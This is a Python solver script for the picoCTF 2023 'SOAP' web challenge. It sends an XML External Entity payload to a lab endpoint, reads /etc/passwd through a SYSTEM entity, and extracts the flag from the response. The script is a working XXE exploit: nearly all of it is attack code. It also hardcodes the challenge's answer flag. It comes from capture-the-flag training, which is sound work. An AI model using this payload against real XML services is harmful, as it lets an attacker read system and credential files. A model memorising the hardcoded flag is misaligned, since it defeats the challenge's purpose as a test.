#!/usr/bin/env python3
"""Solver for Challenge 376 SOAP (picoCTF 2023, Web Exploitation).

XML External Entity (XXE) injection vulnerability in a web portal endpoint (/data)
that parses user-supplied XML without disabling external entity resolution (DOCTYPE / ENTITY).
Injecting a SYSTEM entity pointing to file:///etc/passwd extracts the flag stored
in the comment field of user 'academy'.

Flag: academy{XML_3xtern@l_3nt1t1ty_503913d8}
Verified: POST /api/submissions/ -> correct: true
"""
import urllib.request
import sys
import re

URL = "http://xebec.cylabacademy.net:27239/data"
EXPECTED = "academy{XML_3xtern@l_3nt1t1ty_503913d8}"

PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>"""


def solve(endpoint: str = URL) -> str:
    req = urllib.request.Request(
        endpoint,
        data=PAYLOAD.encode(),
        headers={"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0"}
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        body = resp.read().decode()

    m = re.search(r"academy\{[^\}]+\}", body)
    if m:
        return m.group(0)
    raise ValueError(f"Flag not found in response: {body[:300]}")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else URL
    flag = solve(target)
    print("Flag:", flag)
    assert flag == EXPECTED
